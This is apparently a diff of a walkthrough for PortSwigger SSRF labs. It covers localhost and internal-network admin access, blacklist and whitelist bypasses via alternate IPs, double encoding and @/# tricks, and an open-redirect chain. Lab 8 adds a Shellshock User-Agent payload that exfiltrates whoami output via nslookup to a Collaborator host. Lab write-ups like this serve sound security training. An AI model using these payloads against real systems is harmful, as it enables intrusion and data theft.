@@ -98,55 +98,52 @@ Based on [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side
 
 **Analysis:**
 
-When viewing a product and clicking "Check stock", the request contains a `stockApi` parameter. After URL-decoding it in Burp Suite, it becomes clear that this parameter accepts a full URL.
-
-**Exploitation:**
-
-1. Intercept the stock check request and URL-decode the `stockApi` value.
-2. Change the value to `http://localhost/admin` to access the admin panel.
-3. Navigate to the delete functionality and delete the user `carlos` by using `http://localhost/admin/delete?username=carlos`.
-4. Forward the request and the lab is solved.
+When we go to a product -> "View details" -> click "Check stock", we can see the `stockApi` parameter, which looks like a URL value. 
 
 ![SSRF URL found](/images/SSRF/Lab1_SSRF_URL_Found.png)
 
+After decoding it with `Ctrl+Shift+U` in Burp Suite, we can see parameters like `ProductId` and `StoreId`. Even after removing them, the server still expects valid parameters. Testing shows that the `stockApi` value can accept `http://localhost`.
+
 ![SSRF to localhost](/images/SSRF/Lab1_SSRF_localhost.png)
+
+**Exploitation:**
+
+We change `stockApi` to `http://localhost/admin` to access the admin panel. From there, we use the delete functionality with `delete?username=carlos` to remove the user and solve the lab.
 
 ![SSRF exploit to delete carlos](/images/SSRF/Lab1_SSRF_Exploit.png)
 
 ### Lab 2: Basic SSRF against another backend system
 
-**Goal:** Scan the internal `192.168.0.X` range on port `8080` for an admin interface, then delete the user `carlos`.
+**Goal:** Scan the internal `192.168.0.X` range for an admin interface at port `8080`, then delete the user `carlos`.
 
 **Analysis:**
 
-Similar to Lab 1, the `stockApi` parameter is responsible for fetching stock from a backend system. This time, the target is an internal system on a different host and port.
-
-**Exploitation:**
-
-1. Intercept the request and URL-decode `stockApi`.
-2. Send the request to Intruder and fuzz `X` between `1` and `255` for `http://192.168.0.X:8080/`.
-3. Analyze the responses. Most return `500`, however `192.168.0.40` returned `404`, which indicated the correct internal host.
-4. Access `http://192.168.0.40:8080/admin` via the `stockApi` parameter to view the admin panel.
-5. Use the panel to delete the user `carlos` and solve the lab.
+The "Check stock" functionality again uses the `stockApi` parameter. This time, the stock checker is pointing to an internal backend system.
 
 ![SSRF internal IP found](/images/SSRF/Lab2_SSRF_IPFound.png)
 
+**Exploitation:**
+
+We decode `stockApi` and try changing it to `http://192.168.0.X:8080`. Fuzzing the last octet manually would take too long, so we send it to Intruder and scan from `1` to `255`. 
+
 ![Intruder scanning the internal IP range](/images/SSRF/Lab2_Intruder_IP.png)
+
+We find that `192.168.0.40` returns `404`, while most others return `500`, indicating it's likely the correct host. Appending `/admin` to `http://192.168.0.40:8080` gives us access to the admin panel, and we delete `carlos` from there to solve the lab.
 
 ![Accessing the internal admin panel and deleting carlos](/images/SSRF/Lab2_carlosDelete.png)
 
 ### Lab 3: Blind SSRF with out-of-band detection
 
-**Goal:** Use the analytics functionality to cause the application to make an HTTP request to your Burp Collaborator server.
+**Goal:** This site uses analytics software which fetches the URL specified in the `Referer` header when a product page is loaded. Use this to cause an HTTP request to the Burp Collaborator server.
 
 **Analysis:**
 
-When loading a product page, the application sends a `Referer` header. The analytics software fetches the URL specified in the `Referer` header, making it vulnerable to blind SSRF.
+When loading a product page, we notice the `Referer` header is present. Since the analytics functionality fetches whatever URL is placed in this header, it's vulnerable to blind SSRF.
 
 **Exploitation:**
 
 1. Open Burp Suite -> Collaborator and copy a generated collaborator payload (e.g. `*.oastify.com`).
-2. Intercept a request to a product page and replace the `Referer` header with `http://<your-collaborator-payload>/`.
+2. Intercept a request to a product page and replace the `Referer` header with `http://<your-collaborator-payload>.oastify.com`.
 3. Forward the request and poll Burp Collaborator. The incoming HTTP interaction confirms the blind SSRF and solves the lab.
 
 ```http
@@ -155,6 +152,7 @@ Host: <lab-host>
 Cookie: <session-cookie>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
 Referer: http://<your-collaborator-payload>.oastify.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 ...
 ```
 
@@ -162,24 +160,27 @@ Referer: http://<your-collaborator-payload>.oastify.com
 
 ### Lab 4: SSRF with blacklist-based input filter
 
-**Goal:** Access the admin interface at `http://localhost/admin` and delete the user `carlos` despite a blacklist blocking `localhost`.
+**Goal:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.
 
 **Analysis:**
 
-The application blacklists `localhost`. Direct attempts to use `localhost` are blocked with the error: `"External Stocks Check are Block For Security Reasons"`. We need to bypass this using alternate representations and encoding.
+The `stockApi` parameter is still used here. However, trying `http://localhost` directly gives us `"External Stocks Check are Block For Security Reasons"`. The application is blacklisting `localhost`.
 
 **Exploitation:**
 
-1. Intercept the stock check request and try replacing `localhost` with `127.0.0.1`. In this lab, `127.0.0.1` is also blocked. Next, try `127.1`, which is accepted by some URL parsers/resolvers.
-2. Attempt to access `/admin`. The blacklist also blocks `admin` in this context, so URL-encode it. If a single decode is performed, double-encoding only the required characters (e.g `a` -> `%25%36%31`) can bypass it.
-3. Once the admin panel is accessible, delete the user `carlos` using the same delete endpoint.
-4. The lab is solved.
+1. Try alternate forms of localhost. `127.0.0.1` is also blocked, but `127.1` works in this case and allows us to reach the internal host.
 
 ![IP bypass using alternate localhost form](/images/SSRF/Lab4_SSRF_IPBypass.png)
 
+2. Attempting to access `/admin` is still blocked by the blacklist. URL-encode `/admin` and send it again. It's still denied as the filter only decodes once.
+
 ![Admin path blocked by blacklist](/images/SSRF/Lab4_SSRF_adminFail.png)
 
+3. To bypass a single-decode filter, we double-encode specific characters. Double-encoding just the `a` in `admin` to `%25%36%31` is enough here, allowing us to access the admin panel.
+
 ![Admin accessed after double encoding](/images/SSRF/Lab4_SSRF_AdminBypass.png)
+
+4. From the admin panel, delete `carlos` to solve the lab.
 
 ![Carlos deleted](/images/SSRF/Lab4_carlosDelete.png)
 
@@ -189,18 +190,17 @@ The application blacklists `localhost`. Direct attempts to use `localhost` are b
 
 **Analysis:**
 
-The `stockApi` parameter appears to be filtered and cannot directly reach the internal IP. However, there is a separate functionality (`/product/nextProduct`) that takes a `path` parameter and performs a redirect. This redirect can be chained with SSRF to reach an otherwise blocked internal destination.
-
-**Exploitation:**
-
-1. Intercept both the "next product" request and the stock check request to understand how they work.
-2. Craft a redirect from `/product/nextProduct` that points to `http://192.168.0.12:8080/admin/delete?username=carlos`.
-3. URL-encode the entire redirect URL and pass it to the `stockApi` parameter of the stock check request.
-4. The server will follow the redirect to the internal admin endpoint and delete `carlos`, solving the lab.
+Directly using `192.168.0.12:8080` in `stockApi` is filtered. While looking around, we notice a "Next product" functionality that uses a `path` parameter to redirect: `/product/nextProduct?currentProductId=1&path=/product?productId=2`
 
 ![Open redirect parameter identified](/images/SSRF/Lab5_SSRF_openredirect1.png)
 
+This `path` parameter can be manipulated to redirect to an arbitrary URL, making it an open redirect we can chain with SSRF.
+
 ![Using the path parameter for redirection](/images/SSRF/Lab5_SSRF_openredirect2.png)
+
+**Exploitation:**
+
+We craft a URL using the open redirect to point to the internal admin endpoint: `http://192.168.0.12:8080/admin/delete?username=carlos`. We pass this through the `nextProduct` redirect and fully URL-encode the entire thing before putting it into the `stockApi` parameter of the stock check request. The server follows the redirect and hits the internal admin endpoint, deleting `carlos`.
 
 ![Exploiting via chained open redirect + SSRF](/images/SSRF/Lab5_SSRF_openredirect3.png)
 
@@ -210,20 +210,21 @@ The `stockApi` parameter appears to be filtered and cannot directly reach the in
 
 **Analysis:**
 
-The application enforces a whitelist and only allows requests to `stock.weliketoshop.net`. Any other host is rejected with `"External stock check host must be stock.weliketoshop.net"`. 
+The application enforces a whitelist, only allowing requests to `stock.weliketoshop.net`. Any other host is rejected with `"External stock check host must be stock.weliketoshop.net"`. 
 
-This can be bypassed by exploiting URL parsing confusion. By using the userinfo field (`@`) and fragment (`#`), we can make the HTTP client connect to `localhost`, whilst still satisfying the whitelist check if it only looks for `stock.weliketoshop.net` at the end of the string. As the filter only decodes once, `#` must be double-encoded.
+We can abuse URL parsing by using credentials/userinfo (`@`) and the fragment (`#`). If the whitelist only checks for `stock.weliketoshop.net` at the end of the string, we can make the HTTP client connect to `localhost` whilst satisfying that check. Since the filter only decodes once, `#` needs to be double-encoded.
 
 **Exploitation:**
 
-1. Craft a URL that forces the connection to localhost: `http://localhost%2523@stock.weliketoshop.net/`
-2. Append `/admin` to view the admin panel: `http://localhost%2523@stock.weliketoshop.net/admin`
-3. Use the admin functionality to delete `carlos`: `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
-4. Pass this value to the `stockApi` parameter and send the request to solve the lab.
+1. Craft the payload: `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`
 
 ![Whitelist bypass using @ and double-encoded #](/images/SSRF/Lab7_SSRF1_Bypass.png)
 
+2. First, check the admin panel by appending `/admin` to see it's accessible.
+
 ![Accessing the admin panel via whitelist bypass](/images/SSRF/Lab7_SSRF2.png)
+
+3. Use the delete path to remove `carlos` and solve the lab.
 
 ![Deleting carlos via whitelist bypass](/images/SSRF/Lab7_SSRF3.png)
 
@@ -233,29 +234,33 @@ This can be bypassed by exploiting URL parsing confusion. By using the userinfo 
 
 **Analysis:**
 
-This lab is similar to Lab 3. The application fetches URLs from headers such as `Referer`. An internal server within `192.168.0.X:8080` is vulnerable to Shellshock (CVE-2014-6271). By injecting a Shellshock payload into a header that gets processed by that vulnerable server (commonly `User-Agent`), we can force it to execute OS commands and exfiltrate data via DNS to Burp Collaborator.
+This lab is similar to Lab 3. The application fetches URLs from headers such as `Referer`. An internal server within `192.168.0.X:8080` is vulnerable to Shellshock (CVE-2014-6271). By injecting a Shellshock payload into a header processed by that vulnerable server (commonly `User-Agent`), we can force it to execute OS commands and exfiltrate data via DNS to Burp Collaborator.
 
-**Exploitation:**
-
-1. Copy a Burp Collaborator payload (e.g. `*.oastify.com`).
-2. Intercept a request to a product page. Add or inject the following into the `User-Agent` header:
-
-   ```text
-   () { :; }; /bin/nslookup $(whoami).<your-collaborator-payload>.oastify.com
-   ```
-
-3. Set the `Referer` header to `http://192.168.0.X:8080` to force the internal server to process the request.
-4. Send this request to Intruder and fuzz the last octet of the IP from `1` to `255`.
-5. After the attack completes, go to Burp Collaborator -> Poll now. Look for `nslookup` interactions. The subdomain will reveal the `whoami` output (e.g. `peter.<random>.oastify.com`).
-6. Submit that username to solve the lab.
+Using the `Collaborator Everywhere` extension makes it easier to spot which headers are being fetched.
 
 ![Collaborator Everywhere identifying injection points](/images/SSRF/Lab8_CollaboratorEverywhere2.png)
 
 ![Collaborator Everywhere reporting blind SSRF issues](/images/SSRF/Lab8_CollaboratorEverywhere.png)
 
+**Exploitation:**
+
+1. Copy a Burp Collaborator payload (e.g. `*.oastify.com`).
+2. Intercept a request to a product page. Inject the following into the `User-Agent` header:
+
+   ```text
+   () { :; }; /bin/nslookup $(whoami).<your-collaborator-payload>.oastify.com
+   ```
+
+3. Set the `Referer` header to `http://192.168.0.X:8080`.
+4. Send this request to Intruder and fuzz the last octet of the IP from `1` to `255`.
+
 ![Intruder fuzzing the internal IP range](/images/SSRF/Lab8_SSRFIntruder.png)
 
+5. After the attack completes, go to Burp Collaborator -> Poll now. Look for `nslookup` interactions. The subdomain will reveal the `whoami` output (e.g. `peter.<random>.oastify.com`).
+
 ![Burp Collaborator interactions revealing the internal username](/images/SSRF/Lab8_Lab8_SSRF_FInal.png)
+
+6. Submit that username to solve the lab.
 
 ## Quick Reference
 
